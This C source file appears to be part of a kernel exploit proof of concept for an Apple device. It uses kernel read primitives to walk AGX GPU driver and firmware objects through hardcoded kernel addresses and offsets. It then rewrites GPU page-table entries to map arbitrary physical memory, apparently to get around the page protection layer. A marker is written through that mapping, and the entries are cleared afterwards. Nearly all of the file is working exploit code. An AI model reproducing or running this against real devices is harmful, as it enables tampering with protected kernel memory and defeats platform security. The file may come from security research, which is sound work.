#include "microppl.h"

#include "gfx.h"
#include "offsets.h"
#include "poc.h"

#include <libkextrw.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>

#define AGX_GART_VPTR         UINT64_C(0xfffffe0007edd4a0)
#define AGX_UAT_MUX_VPTR      UINT64_C(0xfffffe0007ee8780)
#define IOUAT_VPTR            UINT64_C(0xfffffe0007eba568)
#define AGX_FIRMWARE_VPTR     UINT64_C(0xfffffe0007ed92e8)

#define GART_UAT_MUX          UINT64_C(0x320)
#define UAT_MUX_IOUAT         UINT64_C(0x10)
#define IOUAT_DRIVER_SERVICE  UINT64_C(0x18)
#define ACCELERATOR_FIRMWARE  UINT64_C(0x598)
#define FIRMWARE_PAYLOAD0     UINT64_C(0x1980)
#define PAYLOAD_RTBUDDY       UINT64_C(0x138)
#define RTBUDDY_SERVICE_CORE  UINT64_C(0x88)
#define RTBUDDY_LOADED_FW     UINT64_C(0x21e8)
#define LOADED_FW_SEGMENTS    UINT64_C(0xa0)

#define OSARRAY_COUNT         UINT64_C(0x14)
#define OSARRAY_OBJECTS       UINT64_C(0x20)
#define MAX_SEGMENTS          64U

#define SEGMENT_PHYSICAL      UINT64_C(0x18)
#define SEGMENT_VIRTUAL       UINT64_C(0x28)
#define SEGMENT_SIZE          UINT64_C(0x30)
#define SEGMENT_FLAGS         UINT64_C(0x40)

#define SOURCE_A              GFX_SCRATCH
#define SOURCE_B              UINT64_C(0xfffffc00000ffcf0)
#define TEST_PHYSICAL         UINT64_C(0x41410000)
#define MARKER                UINT32_C(0x41414141)

static bool expected_vptr(uint64_t object, uint64_t expected)
{
    return object != 0 && kreadptr(object) == kslide(expected);
}

static bool resolve_source(uint64_t source, uint64_t *physical)
{
    uint64_t gart = gPoc.gpu_task;
    uint64_t mux = kreadptr(gart + GART_UAT_MUX);
    uint64_t iouat = mux != 0 ? kreadptr(mux + UAT_MUX_IOUAT) : 0;
    uint64_t accelerator = iouat != 0 ?
        kreadptr(iouat + IOUAT_DRIVER_SERVICE) : 0;
    uint64_t firmware = accelerator != 0 ?
        kreadptr(accelerator + ACCELERATOR_FIRMWARE) : 0;
    uint64_t payload = firmware != 0 ?
        kreadptr(firmware + FIRMWARE_PAYLOAD0) : 0;
    uint64_t service = payload != 0 ?
        kreadptr(payload + PAYLOAD_RTBUDDY) : 0;
    uint64_t core = service != 0 ?
        kreadptr(service + RTBUDDY_SERVICE_CORE) : 0;
    uint64_t loaded = core != 0 ?
        kreadptr(core + RTBUDDY_LOADED_FW) : 0;
    uint64_t array = loaded != 0 ?
        kreadptr(loaded + LOADED_FW_SEGMENTS) : 0;

    if (!expected_vptr(gart, AGX_GART_VPTR) ||
        !expected_vptr(mux, AGX_UAT_MUX_VPTR) ||
        !expected_vptr(iouat, IOUAT_VPTR) ||
        !expected_vptr(firmware, AGX_FIRMWARE_VPTR) || array == 0) {
        return false;
    }

    uint32_t count = kread32(array + OSARRAY_COUNT);
    uint64_t objects = count != 0 && count <= MAX_SEGMENTS ?
        kreadptr(array + OSARRAY_OBJECTS) : 0;
    if (objects == 0) return false;

    for (uint32_t i = 0; i < count; i++) {
        uint64_t segment = kreadptr(objects + i * sizeof(uint64_t));
        uint64_t virtual_address =
            segment != 0 ? kread64(segment + SEGMENT_VIRTUAL) : 0;
        uint64_t size = segment != 0 ?
            kread64(segment + SEGMENT_SIZE) : 0;
        if (source < virtual_address || source - virtual_address >= size) {
            continue;
        }

        uint64_t page = kread64(segment + SEGMENT_PHYSICAL);
        uint64_t offset = source - virtual_address;
        if (page > UINT64_MAX - offset) return false;

        *physical = page + offset;
        printf("source   segment=%u virtual=0x%016llx"
               " physical=0x%016llx size=0x%016llx flags=0x%016llx\n",
               i, virtual_address, *physical, size,
               kread64(segment + SEGMENT_FLAGS));
        return true;
    }
    return false;
}

int microppl_run(unsigned selection)
{
    uint64_t source = selection == 0 ? SOURCE_A : SOURCE_B;
    uint64_t physical = 0;
    bool resolved = selection <= 1 && resolve_source(source, &physical);
    uint64_t page = physical & ~(PAGE_SIZE_16K - 1);
    uint64_t offset = physical & (PAGE_SIZE_16K - 1);
    uint64_t descriptor = page | GFX_DATA_PAGE_DESCRIPTOR;
    uint64_t alias = GFX_TEST_ALIAS + offset;

    bool high_written = resolved && page != 0 &&
        gfx_write32(GFX_TEST_ALIAS_PTE + sizeof(uint32_t),
                    (uint32_t)(descriptor >> 32)) == 0;
    bool low_written = high_written &&
        gfx_write32(GFX_TEST_ALIAS_PTE, (uint32_t)descriptor) == 0;
    bool marker_written = low_written && gfx_write32(alias, MARKER) == 0;

    bool low_cleared = !high_written ||
        gfx_write32(GFX_TEST_ALIAS_PTE, 0) == 0;
    bool high_cleared = !high_written ||
        (low_cleared &&
         gfx_write32(GFX_TEST_ALIAS_PTE + sizeof(uint32_t), 0) == 0);
    bool action = marker_written && low_cleared && high_cleared;

    printf("MICROPPL_PTE_ALIAS_MARK: action=%u selection=%c"
           " observer_required=1"
           " pte=0x%016llx descriptor=0x%016llx"
           " source=0x%016llx physical=0x%016llx"
           " alias=0x%016llx marker=0x%08x"
           " stages=%u/%u/%u/%u/%u"
           " kcall=0 physrw=0 kernel_patch=0\n",
           action ? 1U : 0U, selection == 0 ? 'A' : 'B',
           GFX_TEST_ALIAS_PTE, descriptor, source, physical, alias, MARKER,
           resolved ? 1U : 0U, high_written ? 1U : 0U,
           low_written ? 1U : 0U, marker_written ? 1U : 0U,
           high_cleared ? 1U : 0U);

    if (high_written && !high_cleared) {
        fputs("error: protected PTE state is uncertain; reboot Neo\n", stderr);
    }
    return action ? 0 : 1;
}

int microppl_unmap(void)
{
    bool low_cleared = gfx_write32(GFX_TEST_ALIAS_PTE, 0) == 0;
    bool high_cleared = low_cleared &&
        gfx_write32(GFX_TEST_ALIAS_PTE + sizeof(uint32_t), 0) == 0;
    bool cleared = low_cleared && high_cleared;

    printf("MICROPPL_UNMAP: cleared=%u pte=0x%016llx stages=%u/%u"
           " kcall=0 physrw=0 kernel_patch=0\n",
           cleared ? 1U : 0U, GFX_TEST_ALIAS_PTE,
           low_cleared ? 1U : 0U, high_cleared ? 1U : 0U);
    return cleared ? 0 : 1;
}

int microppl_map_41410000(bool touch)
{
    uint64_t descriptor = TEST_PHYSICAL | GFX_DATA_PAGE_DESCRIPTOR;

    printf("MICROPPL_MAP_PA_BEGIN: physical=0x%016llx"
           " descriptor=0x%016llx pte=0x%016llx"
           " alias=0x%016llx touch=%u\n",
           TEST_PHYSICAL, descriptor, GFX_TEST_ALIAS_PTE, GFX_TEST_ALIAS,
           touch ? 1U : 0U);

    bool high_written =
        gfx_write32(GFX_TEST_ALIAS_PTE + sizeof(uint32_t),
                    (uint32_t)(descriptor >> 32)) == 0;
    bool low_written = high_written &&
        gfx_write32(GFX_TEST_ALIAS_PTE, (uint32_t)descriptor) == 0;
    bool touched = low_written &&
        (!touch || gfx_write32(GFX_TEST_ALIAS, MARKER) == 0);

    if (touch || !low_written) {
        bool cleared = microppl_unmap() == 0;
        printf("MICROPPL_MAP_PA_RESULT: mapped=%u touched=%u retained=0"
               " cleared=%u physical=0x%016llx descriptor=0x%016llx"
               " kcall=0 physrw=0 kernel_patch=0\n",
               low_written ? 1U : 0U, touched ? 1U : 0U,
               cleared ? 1U : 0U, TEST_PHYSICAL, descriptor);
        return touched && cleared ? 0 : 1;
    }

    printf("MICROPPL_MAP_PA_RESULT: mapped=1 touched=0 retained=1"
           " physical=0x%016llx descriptor=0x%016llx"
           " kcall=0 physrw=0 kernel_patch=0\n",
           TEST_PHYSICAL, descriptor);
    return 0;
}

int microppl_cleanup(void)
{
    bool a_cleared = gfx_write32(SOURCE_A, 0) == 0;
    bool b_cleared = gfx_write32(SOURCE_B, 0) == 0;
    bool cleared = a_cleared && b_cleared;
    printf("MICROPPL_CLEANUP: cleared=%u"
           " source_a=0x%016llx source_b=0x%016llx"
           " stages=%u/%u"
           " kcall=0 physrw=0 kernel_patch=0\n",
           cleared ? 1U : 0U, SOURCE_A, SOURCE_B,
           a_cleared ? 1U : 0U, b_cleared ? 1U : 0U);
    return cleared ? 0 : 1;
}
